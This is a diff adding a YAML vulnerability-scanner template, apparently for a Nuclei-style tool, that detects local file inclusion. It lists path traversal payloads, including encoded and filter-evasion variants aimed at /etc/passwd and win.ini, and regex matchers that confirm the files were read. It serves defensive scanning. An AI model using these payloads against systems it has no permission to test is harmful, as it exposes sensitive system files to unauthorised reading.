@@ -1,0 +1,30 @@
+id: http-lfi-detection
+info:
+  name: "Local File Inclusion (LFI) Detection"
+  severity: "High"
+  description: "Detects LFI vulnerabilities by attempting to read sensitive files through path traversal in URL parameters."
+  compliance:
+    owasp: "A01:2021"
+    cwe: "CWE-98"
+requests:
+  - method: GET
+    path: "/"
+    attack: inject
+    inject_in: query
+    payloads:
+      - "../../../etc/passwd"
+      - "..\\..\\..\\windows\\win.ini"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+      - "....//....//....//etc/passwd"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[fonts\\]"
+          - "for 16-bit app support"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: and
